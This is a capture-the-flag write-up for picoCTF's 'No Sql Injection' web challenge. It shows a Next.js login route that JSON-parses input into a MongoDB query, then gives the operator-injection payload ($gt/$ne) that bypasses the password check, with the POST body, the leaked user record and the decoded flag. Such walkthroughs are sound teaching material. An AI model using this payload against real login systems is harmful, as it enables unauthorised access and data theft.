# No Sql Injection (200 points)
Can you try to get access to this website to get the flag?

You can download the source [here]().

The website is running [here](). Can you log in?

## Data
* app.tar.gz

## Solution
We got the following structure of the web application:
```
app
├── app
│   ├── admin
│   │   └── page.tsx
│   ├── api
│   │   └── login
│   │       └── route.ts
│   ├── favicon.ico
│   ├── globals.css
│   ├── layout.tsx
│   └── page.tsx
├── components
│   ├── Spinner.css
│   └── Spinner.tsx
├── models
│   └── user.ts
├── next.config.js
├── next-env.d.ts
├── package.json
├── package-lock.json
├── postcss.config.js
├── public
│   ├── next.svg
│   └── vercel.svg
├── tsconfig.json
└── utils
    ├── database.ts
    └── seed.ts
```

The first file that we want to investigate is `utils/seed.ts`. Inhere we can find a default user that is created:
```ts
    const newUser = new User({
      firstName: "Josh",
      lastName: "Iriya",
      email: "joshiriya355@mumbama.com",
      password: process.env.NEXT_PUBLIC_PASSWORD as string
    });
```
So we have an email to log in with: `joshiriya355@mumbama.com`

If we take a look into the file `utils/database.ts` we get the information that the application uses MongoDB:
```ts
import mongoose, { ConnectOptions } from "mongoose";

[...]
```

Sence we know from the challenge name that their is a NoSQL injection, we should take a look into the source code that generates the database request. In this case it's the file `api/login/route.ts`. The following part is relevant for us:
```ts
    const users = await User.find({
      email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
      password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password
    });
```

This is the MongoDB request. If the input (email or password) starts with a `{` and ends with a `}`, the program parses it as JSON string. Otherwise it will be a normal string. But the input is directly pasted into the request and not further filtered, checked or sanitized. 

So we can input any MongoDB characters. For example we can use the following injection:
```
{
  "$gt": "",
  "$ne": null
}
```
This would search for a value that is greater that an empty string and not equal to null. This can't exist, obviously. So this request is always true.

We can now combine this with our known mail adress (`"` has to be escaped in the POST request):
```
{
  "email":"joshiriya355@mumbama.com",
  "password":"{\"$gt\": \"\", \"$ne\": null}"
}
```

If we send this POST request and analyse the response, we retrieve the following object:
```
HTTP/1.1 200 OK
vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding
content-type: text/plain;charset=UTF-8
date: Tue, 19 Mar 2024 14:01:16 GMT
connection: close
Content-Length: 237

[{"_id":"65f08c7b410684fbd599d448","email":"joshiriya355@mumbama.com","firstName":"Josh","lastName":"Iriya","password":"Je80T8M7sUA","token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzUzZDkwZTI4fQ==","__v":0}]
```

The token looks like Base64. So we can try to decode it:
```
$ echo "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzUzZDkwZTI4fQ==" | base64 -d
picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_53d90e28}
```

And we got our flag!
